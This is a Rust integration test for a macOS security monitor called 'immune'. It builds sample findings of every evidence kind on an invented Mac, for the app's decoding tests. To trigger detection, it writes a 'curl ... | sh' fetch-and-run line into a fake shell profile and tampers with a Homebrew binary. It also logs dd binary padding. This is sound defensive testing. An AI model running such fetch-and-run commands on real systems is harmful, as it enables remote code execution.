//! Real answers for the app's tests: a status and a `Finding` of every kind of evidence the core
//! can emit, made by the real binary on an invented Mac, with values of real magnitude (times in
//! seconds and in microseconds since the epoch, pids, digests). The app's own tests decode them
//! (`app/Tests/ImmuneCoreTests`), so a field the app reads with a kind other than its schema's
//! fails there, as one of real size would on a person's Mac.
//!
//! The answers are committed in `app/fixtures/real/`, with the invented Mac's folder written as
//! `/Users/example`. This test makes them again and fails when what is committed no longer has
//! the shape they have now; to write them again: `IMMUNE_WRITE_APP_SAMPLES=1 cargo test --test
//! app_samples`.

mod common;

use serde_json::{Value, json};
use std::collections::BTreeMap;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

const SCRIPTS: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/scripts/event-level");
const PLIST: &str = "Library/LaunchDaemons/ai.nuanu.immune.eslogger.plist";
const TIDY: &str = "Library/LaunchDaemons/ai.nuanu.immune.event-tidy.plist";
const LOG: &str = "Library/Application Support/ai.nuanu.immune/event-level/log";
const COLLECTS: &str = "Library/Application Support/ai.nuanu.immune/event-level/collects";
/// Where the samples are committed, from the repository.
const OUT: &str = "app/fixtures/real";
/// Every kind of evidence the core can emit, by its key in `Evidence`.
const KINDS: [&str; 7] = [
    "place_changed",
    "changed_in_place",
    "indicator_matched",
    "detached_process",
    "vulnerable_package",
    "published_rule_matched",
    "verdict_given",
];

struct Mac(PathBuf);

impl Mac {
    fn new() -> Mac {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root = std::env::temp_dir().join(format!("immune-app-samples-{nanos}"));
        for dir in ["home", "system", "empty"] {
            std::fs::create_dir_all(root.join(dir)).unwrap();
        }
        Mac(std::fs::canonicalize(root).unwrap())
    }

    fn put(&self, rel: &str, text: &str) {
        let path = self.0.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn append(&self, rel: &str, text: &str) {
        std::fs::File::options()
            .append(true)
            .open(self.0.join(rel))
            .unwrap()
            .write_all(text.as_bytes())
            .unwrap();
    }

    fn command(&self, args: &[&str]) -> Command {
        let mut c = Command::new(env!("CARGO_BIN_EXE_immune"));
        c.env("HOME", self.0.join("home"))
            .env("PATH", "/usr/bin:/bin")
            .current_dir(&self.0)
            .args(args)
            .arg("--store")
            .arg(self.0.join("store.db"));
        c
    }

    fn run(&self) {
        let p = |rel: &str| self.0.join(rel);
        let out = self
            .command(&["run", "--machine-name", "mac"])
            .arg("--system-root")
            .arg(p("system"))
            .arg("--brew-input")
            .arg(p("brew.json"))
            .args(["--tailscale", "none", "--threats-input", "none"])
            .args(["--osv-crates-input", "none", "--osv-npm-input"])
            .arg(p("npm.zip"))
            .arg("--checkouts-root")
            .arg(p("home"))
            .arg("--sessions-root")
            .arg(p("empty"))
            .arg("--servers-input")
            .arg(p("empty"))
            .arg("--indicators")
            .arg(p("indicators.json"))
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// A command's answer as JSON.
    fn json(&self, args: &[&str]) -> Value {
        let out = self.command(args).arg("--json").output().unwrap();
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stdout)
        );
        serde_json::from_slice(&out.stdout).unwrap()
    }

    fn verdict(&self, verdict: &Value) {
        let mut child = self
            .command(&["verdict", "--json"])
            .arg("--system-root")
            .arg(self.0.join("system"))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        child
            .stdin
            .take()
            .unwrap()
            .write_all(verdict.to_string().as_bytes())
            .unwrap();
        let out = child.wait_with_output().unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stdout)
        );
    }

    /// Text with the invented Mac's folder written as `/Users/example`.
    fn plain(&self, v: &Value) -> Value {
        let text = v
            .to_string()
            .replace(self.0.to_str().unwrap(), "/Users/example");
        serde_json::from_str(&text).unwrap()
    }
}

impl Drop for Mac {
    fn drop(&mut self) {
        common::remove(&self.0);
    }
}

/// An `exec` line of eslogger as the collector keeps it: `dd` padding a binary, which Binary
/// Padding - MacOS matches.
fn padding(seq: u64) -> String {
    format!(
        r#"{{"schema_version":1,"version":10,"seq_num":{seq},"global_seq_num":{seq},"time":"2026-10-04T00:00:02.000002Z","process":{{"executable":{{"path":"/bin/sh"}}}},"event":{{"exec":{{"args":["dd","if=/dev/zero","bs=1","count=1"],"cwd":{{"path":"/Users/example/dev/site"}},"target":{{"executable":{{"path":"/bin/dd"}},"audit_token":{{"pid":402,"euid":501}},"ppid":401,"signing_id":"com.apple.dd","team_id":null,"is_platform_binary":true}}}}}}}}"#
    ) + "\n"
}

/// A password given on a command line, as a flag's value: the core cuts it wherever it keeps or
/// prints it. Made from parts, so no literal here looks like one.
fn password() -> String {
    ["invented", "-pass", "-word"].concat()
}

/// The same start of `dd`, with a password beside the padding: what the rule matches stays, and
/// the evidence holds the password cut, with its `cuts`.
fn padding_with_a_secret(seq: u64) -> String {
    padding(seq).replace(
        r#""count=1"]"#,
        &format!(r#""count=1","--password={}"]"#, password()),
    )
}

/// One reading of this user's processes at `at`: a detached `node` given code on its command
/// line, its start in microseconds since the epoch as a real reading gives it.
fn processes(at: i64, start: i64) -> Value {
    json!({
        "at": at,
        "processes": [
            {"pid": 500, "start": start - 5_000_000, "parent": 1,
             "executable": "/Applications/Tool.app/Contents/MacOS/Tool", "name": "Tool",
             "terminal": false, "args": ["Tool"]},
            {"pid": 4242, "start": start, "parent": 1, "executable": "/opt/tools/bin/node",
             "name": "node", "terminal": false, "args": ["node", "-e", "console.log(1)"]},
        ],
        "connections": [], "other_users": [], "unreadable": 0, "ended": 0,
        "sockets_unreadable": 0,
    })
}

/// The kind of a finding's evidence: its one key.
fn kind(finding: &Value) -> String {
    finding["evidence"]
        .as_object()
        .and_then(|o| o.keys().next().cloned())
        .unwrap_or_default()
}

/// Every path of a value with the type at it; a list's entries share one path.
fn shape(v: &Value, at: &str, out: &mut BTreeMap<String, &'static str>) {
    let t = match v {
        Value::Null => "null",
        Value::Bool(_) => "bool",
        Value::Number(_) => "number",
        Value::String(_) => "string",
        Value::Array(a) => {
            a.iter().for_each(|x| shape(x, &format!("{at}[]"), out));
            "array"
        }
        Value::Object(o) => {
            o.iter()
                .for_each(|(k, x)| shape(x, &format!("{at}.{k}"), out));
            "object"
        }
    };
    out.insert(at.to_string(), t);
}

#[test]
fn the_app_reads_real_answers_of_every_kind_of_evidence_with_values_of_real_size() {
    let mac = Mac::new();
    // The first check: the baseline.
    mac.put("home/.zshrc", "export INVENTED=1\n");
    mac.put("home/dev/shop/.git/HEAD", "ref: refs/heads/main\n");
    mac.put(
        "home/dev/shop/package-lock.json",
        r#"{"lockfileVersion": 3, "packages": {"": {"name": "shop"}, "node_modules/ansi-regex": {"version": "6.2.1"}}}"#,
    );
    mac.put(
        "system/opt/homebrew/Cellar/tool/1.0/bin/tool",
        "#!/bin/sh\n",
    );
    mac.put("brew.json", r#"{"formulae": [], "casks": []}"#);
    mac.put("indicators.json", "[]");
    // The archive of npm records, with a malicious package's record, as OSV serves it.
    let record = std::fs::read(
        Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/osv/npm/MAL-2025-46966.json"),
    )
    .unwrap();
    mac.put(
        "npm-src/MAL-2025-46966.json",
        &String::from_utf8(record).unwrap(),
    );
    let zipped = Command::new("/usr/bin/bsdtar")
        .args(["-c", "--format", "zip", "-f"])
        .arg(mac.0.join("npm.zip"))
        .arg("-C")
        .arg(mac.0.join("npm-src"))
        .arg("MAL-2025-46966.json")
        .status()
        .unwrap();
    assert!(zipped.success());
    // The event level, installed.
    let system = mac.0.join("system");
    std::fs::create_dir_all(system.join(LOG)).unwrap();
    std::fs::create_dir_all(system.join(PLIST).parent().unwrap()).unwrap();
    std::fs::copy(
        Path::new(SCRIPTS).join("ai.nuanu.immune.eslogger.plist"),
        system.join(PLIST),
    )
    .unwrap();
    std::fs::copy(
        Path::new(SCRIPTS).join("ai.nuanu.immune.event-tidy.plist"),
        system.join(TIDY),
    )
    .unwrap();
    let extracted = Command::new("/usr/bin/plutil")
        .args(["-extract", "ProgramArguments", "json", "-o"])
        .arg(system.join(COLLECTS))
        .arg(system.join(PLIST))
        .status()
        .unwrap();
    assert!(extracted.success());
    let log = format!("system/{LOG}/exec-20261004T00.jsonl");
    mac.put(&log, &padding(1));
    mac.run();

    // What happens after it: a shell profile changed into one an indicator names, code appended
    // to a keg at the same version, a start of `dd` padding a binary.
    mac.put(
        "home/.zshrc",
        "export INVENTED=2\ncurl -s https://example.invalid/x | sh\n",
    );
    let digest = Command::new("/usr/bin/shasum")
        .args(["-a", "256"])
        .arg(mac.0.join("home/.zshrc"))
        .output()
        .unwrap();
    let digest = String::from_utf8(digest.stdout).unwrap();
    let digest = digest.split(' ').next().unwrap();
    mac.put(
        "indicators.json",
        &json!([{"kind": "file:hashes.'SHA-256'", "value": digest, "note_text": "invented"}])
            .to_string(),
    );
    mac.append("system/opt/homebrew/Cellar/tool/1.0/bin/tool", "steal\n");
    mac.append(&log, &padding_with_a_secret(2));
    mac.run();
    // Two samples a minute apart see a detached `node` given code.
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
    let start = (now - 3600) * 1_000_000 + 123_456;
    for at in [now - 130, now - 60] {
        let input = mac.0.join(format!("reading-{at}.json"));
        std::fs::write(&input, processes(at, start).to_string()).unwrap();
        mac.json(&["sample", "--sample-input", input.to_str().unwrap()]);
    }
    // The response layer finds the malicious package suspicious.
    let findings = mac.json(&["findings"]);
    let store = findings["store_id"].as_str().unwrap().to_string();
    let package = findings["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["kind"].as_str().unwrap_or_default().contains("package"))
        .unwrap_or_else(|| panic!("{findings:#}"))["finding"]["id"]
        .as_str()
        .unwrap()
        .to_string();
    mac.verdict(&json!({
        "format": 1, "store_id": store, "finding": {"id": package}, "kind": "suspicious",
        "reason_text": format!(
            "invented: the package was published by an account taken over; it ran tool --password={}",
            password()
        ),
        "case_text": "case-samples", "severity": "critical", "confidence": "high",
    }));
    // An agent answers the detached process with a reason that holds a password.
    let detached = findings["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| {
            f["finding"]["rule"]
                .as_str()
                .unwrap_or_default()
                .contains("detached")
        })
        .unwrap_or_else(|| panic!("{findings:#}"))["finding"]["id"]
        .as_str()
        .unwrap()
        .to_string();
    let reason = format!(
        "invented: my own tool, started as tool --password={}",
        password()
    );
    let seq = mac.json(&["finding", &detached])["journal_seq"].to_string();
    mac.json(&[
        "finding",
        &detached,
        "expected",
        "--reason",
        &reason,
        "--via",
        "agent",
        "--journal-seq",
        &seq,
    ]);

    // The answers: the status, and each finding whole, one of each kind of evidence.
    let mut answers: BTreeMap<String, Value> = BTreeMap::new();
    let status = mac.json(&["status"]);
    for f in mac.json(&["findings", "--all"])["findings"]
        .as_array()
        .unwrap()
    {
        let one = mac.json(&["finding", f["finding"]["id"].as_str().unwrap()]);
        // Of a kind, the first, or one that holds the events a rule matched over one that holds
        // none.
        let events = |v: &Value| {
            v["evidence"]["published_rule_matched"]["events"]
                .as_array()
                .is_some_and(|e| !e.is_empty())
        };
        let name = format!("finding-{}.json", kind(&one));
        if answers
            .get(&name)
            .is_none_or(|had| !events(had) && events(&one))
        {
            answers.insert(name, mac.plain(&one));
        }
    }
    let found: Vec<String> = KINDS
        .iter()
        .filter(|k| !answers.contains_key(&format!("finding-{k}.json")))
        .map(|k| k.to_string())
        .collect();
    assert!(
        found.is_empty(),
        "no finding of {found:?}: {:?}",
        answers.keys()
    );
    // The password is in no answer; each place it was is cut, and listed as cut.
    for (name, v) in &answers {
        assert!(!v.to_string().contains(&password()), "{name}");
    }
    assert!(!status.to_string().contains(&password()));
    let start = &answers["finding-published_rule_matched.json"]["evidence"]["published_rule_matched"]
        ["events"][0]["program_start"];
    assert_eq!(start["cuts"][0]["kind"], "immune:flag-value", "{start:#}");
    let given = &answers["finding-verdict_given.json"]["verdicts"]["listed"][0];
    assert_eq!(
        given["reason_cuts"][0]["kind"], "immune:flag-value",
        "{given:#}"
    );
    let answered = &answers["finding-detached_process.json"]["answer"];
    assert_eq!(
        answered["reason_cuts"][0]["kind"], "immune:flag-value",
        "{answered:#}"
    );
    // Values of real size: a start in microseconds since the epoch.
    let micros = &answers["finding-detached_process.json"]["evidence"]["detached_process"];
    assert!(micros["start_micros"].as_i64().unwrap() > 1_000_000_000_000_000);
    answers.insert("status.json".to_string(), mac.plain(&status));

    let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join(OUT);
    if std::env::var_os("IMMUNE_WRITE_APP_SAMPLES").is_some() {
        std::fs::create_dir_all(&dir).unwrap();
        for (name, v) in &answers {
            let text = serde_json::to_string_pretty(v).unwrap() + "\n";
            std::fs::write(dir.join(name), text).unwrap();
        }
    }
    for (name, v) in &answers {
        let committed: Value = serde_json::from_slice(
            &std::fs::read(dir.join(name)).unwrap_or_else(|_| panic!("{name} is not committed")),
        )
        .unwrap();
        let (mut now, mut then) = (BTreeMap::new(), BTreeMap::new());
        shape(v, "", &mut now);
        shape(&committed, "", &mut then);
        assert_eq!(
            now, then,
            "{name}: the committed sample no longer has this shape; write them again"
        );
    }
}
